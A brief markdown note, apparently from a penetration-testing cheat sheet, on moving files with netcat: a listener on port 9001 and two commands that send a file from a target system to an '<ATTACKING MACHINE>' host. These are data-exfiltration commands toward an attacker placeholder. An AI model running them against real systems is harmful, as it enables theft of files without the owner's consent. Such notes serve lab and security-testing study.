
## NC 
You can transfer files via netcat using setting up a listener on the box you want to receive the file like so;
`nc -lvnp 9001 > <FILE>`

On the system you want to extract files from, you can 
`nc <ATTACKING MACHINE 9001 < <FILE>`
or
`cat <file> | nc <ATTACKING MACHINE> 9001`


**You may need to terminate the nc listener receiving the file as it can hang and keep the connection active** 

